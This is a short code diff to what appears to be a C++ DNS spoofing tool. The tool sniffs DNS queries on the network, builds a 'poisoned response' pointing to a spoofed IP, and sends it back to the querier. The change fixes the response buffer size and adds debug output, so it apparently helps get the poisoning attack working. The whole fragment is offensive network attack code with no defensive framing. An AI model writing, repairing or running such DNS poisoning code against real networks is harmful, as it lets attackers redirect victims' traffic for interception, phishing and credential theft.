@@ -130,6 +130,7 @@ int main(int argc, const char *argv[]) {
 
         // craft the poisoned response
         int responseSize = forgeDns(dns, &spoofIp, buffer.data());
+        buffer.resize(responseSize);
 
         struct in_addr originalSrc;
         struct in_addr originalDst;
@@ -137,8 +138,11 @@ int main(int argc, const char *argv[]) {
         originalSrc.s_addr = ip->saddr;
         originalDst.s_addr = ip->daddr;
 
+        std::cout << "craft a repsonse with size: " << buffer.size() << std::endl;
+
         // reply
         ipEngine.sendUdp(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
+        std::cout << "sending reply" << std::endl;
     });
     std::cout << "starting dns sniff" << std::endl;
     ipEngine.startSniff("udp and dst port domain");
